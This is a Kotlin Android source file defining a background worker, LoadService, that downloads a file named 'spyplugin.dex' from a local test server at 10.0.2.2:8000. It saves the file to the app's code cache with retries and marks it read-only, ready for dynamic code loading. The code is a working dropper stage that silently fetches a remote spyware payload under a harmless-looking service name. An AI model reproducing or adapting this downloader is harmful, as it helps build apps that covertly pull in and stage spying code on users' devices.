package com.example.background

import android.annotation.SuppressLint
import android.app.DownloadManager
import android.content.Context
import android.net.Uri
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import okhttp3.CacheControl
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

class LoadService(appContext: Context, workerParams: WorkerParameters)
    : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result {
        return try {
            val file = downloadDex2(applicationContext, "http://10.0.2.2:8000/spyplugin.dex")
            Result.success()
        } catch (e: Exception) {
            Log.d("LoadService", "exception service", e)
            Result.failure()
        }
    }

    suspend fun downloadDex(context: Context, urlString: String): File =
        withContext(Dispatchers.IO) {

            val tempFile = File(context.codeCacheDir, "spyplugin.tmp")
            val finalFile = File(context.codeCacheDir, "spyplugin.dex")

            if (tempFile.exists()) tempFile.delete()

            val url = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.connectTimeout = 60000
            connection.readTimeout = 60000
            connection.requestMethod = "GET"
            connection.doInput = true

            connection.connect()

            if (connection.responseCode != HttpURLConnection.HTTP_OK) {
                throw Exception("HTTP ${connection.responseCode}")
            }

            val buffer = ByteArray(8192)

            connection.inputStream.use { input ->
                FileOutputStream(tempFile).use { output ->
                    while (true) {
                        val bytes = input.read(buffer)
                        if (bytes <= 0) break
                        output.write(buffer, 0, bytes)
                    }
                    output.flush()
                }
            }

            connection.disconnect()

            finalFile.delete()
            tempFile.renameTo(finalFile)

            finalFile.setWritable(false)

            finalFile
        }

    suspend fun downloadDex2(context: Context, url: String): File =
        withContext(Dispatchers.IO) {

            val client = OkHttpClient.Builder()
                .connectTimeout(60, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .build()

            val tempFile = File(context.codeCacheDir, "spyplugin.tmp")
            val finalFile = File(context.codeCacheDir, "spyplugin.dex")

            repeat(10) { attempt ->
                try {

                    if (tempFile.exists()) tempFile.delete()

                    val request = Request.Builder()
                        .url(url)
                        .get()
                        .build()

                    client.newCall(request).execute().use { response ->

                        if (!response.isSuccessful) {
                            throw IOException("HTTP ${response.code}")
                        }

                        val body = response.body ?: throw IOException("Empty body")

                        body.byteStream().use { input ->
                            FileOutputStream(tempFile).use { output ->
                                input.copyTo(output)
                            }
                        }
                    }

                    finalFile.delete()
                    tempFile.renameTo(finalFile)
                    finalFile.setWritable(false)

                    return@withContext finalFile

                } catch (e: Exception) {

                    if (attempt == 9) {
                        throw e
                    }

                    delay(2000) // пауза перед повтором
                }
            }

            throw IOException("Download failed after 10 attempts")
        }
}